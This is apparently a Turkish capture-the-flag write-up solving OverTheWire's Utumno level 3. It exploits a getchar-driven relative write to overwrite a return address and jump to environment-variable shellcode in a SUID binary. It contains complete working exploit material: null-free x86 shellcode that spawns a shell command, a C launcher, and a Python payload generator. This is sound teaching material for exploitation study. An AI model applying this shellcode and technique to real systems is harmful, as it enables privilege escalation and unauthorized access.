# OverTheWire — Utumno Level 3 Çözümü (utumno3 → utumno4)

> Hedef: `utumno3` kullanıcısından `utumno4` kullanıcısının şifresini elde etmek.
> Teknik: `getchar` ile **keyfi (relative) yazma primitifi** → return adresini byte-byte ez;
> executable stack'te env-var shellcode; komutu **shellcode'a gömerek** stdio buffering'i aş.

---

## 1. Bağlantı

```bash
ssh utumno3@utumno.labs.overthewire.org -p 2227
# şifre: **********   (bir önceki seviyeden)
```

---

## 2. Keşif (Recon)

```bash
ls -la /utumno/utumno3
# -r-sr-x--- 1 utumno4 utumno3 12424 utumno3   <-- SUID utumno4, grup utumno3 = OKUNABİLİR
strings /utumno/utumno3 | grep -E 'getchar|protector|argc'
#   getchar
#   GNU C17 ... -fno-stack-protector ...     <-- canary YOK
readelf -l /utumno/utumno3 | grep -A1 GNU_STACK
#   GNU_STACK ... RWE                          <-- stack EXECUTABLE
```

Çalıştırma testi:
```bash
/utumno/utumno3        # Segmentation fault (girdisiz çöküyor)
```
- Tek dış fonksiyon **`getchar`** → girdi stdin'den (argc kısıtı YOK, utumno2'den farklı).
- **canary yok + executable stack + ASLR kapalı.**

---

## 3. Statik Analiz — `main` (keyfi yazma primitifi)

```bash
objdump -d -M intel /utumno/utumno3 | sed -n '/<main>:/,/^$/p'
```

Sözde kod:
```c
int main(void) {                  // ebp-0x38 = buf[24], ebp-0x4 = i, ebp-0x8 = c
    int i = 0, c;
    while ((c = getchar()) != EOF && i <= 23) {
        buf[i] = c;
        buf[i] ^= (3 * i);                          // transform
        char v = getchar();                          // ikinci karakter (değer)
        *(char*)(ebp + (signed char)buf[i] - 0x20) = v;   // <<< KEYFİ YAZMA
        i++;
    }
    return 0;
}
```

Her iterasyon **2 byte** okur:
1. `c` → offset seçici. `idx = c ^ (3*i)` (işaretli byte, [-128,127]).
2. `v` → yazılacak değer.
- Yazma yeri: **`ebp + idx - 0x20`** → `idx ∈ [-128,127]` ile `ebp-0xA0 .. ebp+0x5F` arası.
- **Return adresi `ebp+4`** → ona yazmak için `idx - 0x20 = 4` ⇒ **`idx = 0x24`**.
- `idx = c ^ 3i` olduğundan, istenen idx için `c = idx ^ (3*i)`.

Yani return adresinin 4 byte'ını (ebp+4..ebp+7) `idx = 0x24..0x27` ile tek tek yazabiliriz.

---

## 4. Strateji

- Shellcode'u büyük **NOP sled** ile bir env değişkenine (`EGG`) koy (stack RWE, ASLR yok).
- `getchar` primitifiyle return adresini (`ebp+4`) sled'in ortasına yaz.
- Döngüyü `i > 23` ile bitir (EOF değil) → 24 iterasyon; ilk 4'ü adres yazar, kalan 20'si
  zararsız yere yazar (`idx=0`, `ebp-0x20` padding).
- Döngü bitince `leave; ret` → sled → shellcode → **utumno4 shell/komut**.

### Girdi (stdin) byte akışı
`getchar` sırası: `c0 v0 c1 v1 ... c23 v23` (48 byte) + 1 byte (son `cond` getchar, `i=24` → döngü biter) = **49 kontrol byte'ı**.

| i | idx | c = idx^3i | v |
|---|-----|-----------|---|
| 0 | 0x24 | 0x24 | ret[0] |
| 1 | 0x25 | 0x26 | ret[1] |
| 2 | 0x26 | 0x20 | ret[2] |
| 3 | 0x27 | 0x2e | ret[3] |
| 4..23 | 0x00 | 3i | 0x90 (filler) |

### Adres bulma (deterministik)
ASLR kapalı. Hedefle **aynı koşulda** (aynı 15-karakter path, aynı `envp={EGG}`) bir printer
`execve` edip `environ[0]` adresini öğren → hedefin EGG adresi ile birebir aynı.
`RET = environ[0] + 4 (EGG= atla) + 30000 (60KB sled ortası)`.

---

## 5. KRİTİK Bug — stdio buffering (`getchar`)

İlk yaklaşım: shellcode `/bin/sh` açsın, kalan stdin'i komut olarak okusun. **Çalışmadı.**

> `strace` exploit'in **çalıştığını** kanıtladı: `execve("/bin/sh", ...) = 0` görünüyordu.
> Ama spawn olan shell hiçbir şey yapmadı. Sebep: **glibc `getchar` (FILE*) ilk çağrıda
> tüm stdin'i (4096'ya kadar) buffer'a çeker.** Döngü 49 byte kullanır, kalan komut byte'ları
> glibc buffer'ında kalır — `execve` ile o bellek **silinir**. Yeni shell stdin'de EOF görür → çıkar.

**Denenen çözüm (kırılgan):** stdin'i FIFO yapıp komutu gecikmeli gönder → target başlangıcı
yavaşsa (60KB env kopyası) yine slurp ediliyor. Timing güvenilmez.

**Nihai çözüm (deterministik):** komutu **shellcode'un içine göm.** Env var her byte'a izin
verir (filename değil, badchar yok) → null-free bir shellcode `/bin/sh -c "cat ..."`'i
stack'te kurup çalıştırır. stdin'e hiç ihtiyaç kalmaz.

---

## 6. Final Exploit

### Self-contained shellcode (null-free, 100 bayt)
```
setreuid(geteuid(), geteuid());
execve("/bin/sh",
       ["/bin/sh", "-c", "cat /etc/utumno_pass/utumno4", NULL],
       NULL);
```
Tüm string'ler (`"/bin//sh"`, `"-c"`, komut) `push` ile stack'te kurulur (env var'da null yok).
```c
unsigned char sc[]={
 0x31,0xc0,0xb0,0xc9,0xcd,0x80,0x89,0xc3,0x89,0xc1,0x31,0xc0,0xb0,0xcb,0xcd,0x80, /* setreuid */
 0x31,0xc0,0x50,                                                                  /* push NUL */
 0x68,0x6d,0x6e,0x6f,0x34, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x70,0x61,0x73,0x73,    /* "cat /etc/utumno_pass/utumno4" */
 0x68,0x6d,0x6e,0x6f,0x5f, 0x68,0x2f,0x75,0x74,0x75, 0x68,0x2f,0x65,0x74,0x63,
 0x68,0x63,0x61,0x74,0x20, 0x89,0xe6,                                             /* esi=cmd */
 0x31,0xc0,0x50, 0x66,0xc7,0x04,0x24,0x2d,0x63, 0x89,0xe7,                         /* "-c"; edi=-c */
 0x31,0xc0,0x50, 0x68,0x2f,0x2f,0x73,0x68, 0x68,0x2f,0x62,0x69,0x6e, 0x89,0xe5,    /* "/bin//sh"; ebp=binsh */
 0x31,0xc0,0x50,0x56,0x57,0x55, 0x89,0xe1,0x89,0xeb,0x31,0xd2,                     /* argv=[binsh,-c,cmd,0]; ecx=argv; ebx=binsh */
 0x31,0xc0,0xb0,0x0b,0xcd,0x80};                                                  /* execve */
```

### `ex3.c` — EGG kurucu + launcher
```c
#include <unistd.h>
#include <string.h>
#include <stdio.h>
unsigned char sc[]={ /* yukarıdaki 100 bayt */ };
#define SLED 60000
static char eggenv[4+SLED+256];
static char *envp[2];
int main(int argc,char**argv){
 memcpy(eggenv,"EGG=",4); memset(eggenv+4,0x90,SLED);
 memcpy(eggenv+4+SLED,sc,sizeof sc); eggenv[4+SLED+sizeof sc]=0;
 envp[0]=eggenv; envp[1]=0;
 if(argc>=2 && !strcmp(argv[1],"find")){ char *av[]={"/tmp/p2A7xK9mLq",0}; execve("/tmp/p2A7xK9mLq",av,envp); }
 else { char *av[]={"/utumno/utumno3",0}; execve("/utumno/utumno3",av,envp); }
 perror("execve"); return 1;
}
```

### `pr.c`
```c
#include <stdio.h>
extern char **environ;
int main(){ printf("ENVADDR=%p\n",(void*)environ[0]); return 0; }
```

### Çalıştırma
```bash
gcc -m32 -o ex3 ex3.c
gcc -m32 -o /tmp/p2A7xK9mLq pr.c        # 15-char path (len == /utumno/utumno3)

ENV0=$(./ex3 find | sed -n 's/.*ENVADDR=0x\([0-9a-f]*\).*/\1/p')
RET=$(python3 -c "print('%x'%(int('$ENV0',16)+4+30000))")     # sled ortası

# 49 kontrol byte'ı: ret adresini ebp+4..7'ye yaz, döngüyü bitir
python3 - "$RET" > ctrl.bin <<'PY'
import sys
ret=int(sys.argv[1],16); b=ret.to_bytes(4,'little'); s=bytearray()
for i in range(24):
    if i<4: idx=0x24+i; v=b[i]
    else:   idx=0x00;   v=0x90
    s+=bytes([(idx^(3*i))&0xff, v])
s+=b'\n'
sys.stdout.buffer.write(s)
PY

./ex3 run < ctrl.bin            # ret -> sled -> shellcode -> "cat" şifreyi basar
```

Çıktı:
```
ENV0=fffef51f RET=ffff6a53
**********
```

---

## Özet / Alınan Dersler

| Konu | Not |
|------|-----|
| **Keyfi relative yazma** | `*(ebp+idx-0x20)=v` → `idx=0x24` ile return adresi (`ebp+4`) ezilir |
| **Byte-byte ret overwrite** | XOR transform (`c^3i`) bilindiği için her byte için doğru `c` seçilir |
| **Döngüyü EOF'suz bitirme** | `i>23` ile bitir (24 iterasyon) → stdin gerekirse açık kalır |
| **stdio read-ahead** | `getchar` tüm pipe'ı slurp eder; `execve` buffer'ı siler → leftover stdin kaybolur |
| **FIFO timing kırılgan** | Yavaş hedef başlangıcı yarış koşulu yaratır |
| **Komutu shellcode'a göm** | En sağlam yol: env var badchar'sız → `/bin/sh -c "cat ..."` stack'te kur |
| **strace = teşhis** | `execve("/bin/sh")` göründü → mantık doğru, sorun I/O katmanında |
